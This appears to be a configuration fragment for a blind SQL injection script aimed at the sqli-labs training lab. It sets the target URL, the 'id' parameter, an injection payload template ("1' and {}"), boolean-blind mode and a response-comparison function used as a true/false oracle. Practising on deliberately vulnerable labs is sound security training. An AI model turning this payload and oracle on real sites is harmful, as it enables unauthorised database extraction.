url = "http://sqlilabs.cc/Less-1/"
method = 'get'
injerp = 'id'
param = {'id':''}
payload = "1' and {}"
dbnmax = 100
type = 'boolen'
time = 2 # 盲注

def right(freq,req):
    fhtml = freq.text
    html = req.text
    return fhtml != html
rightf = right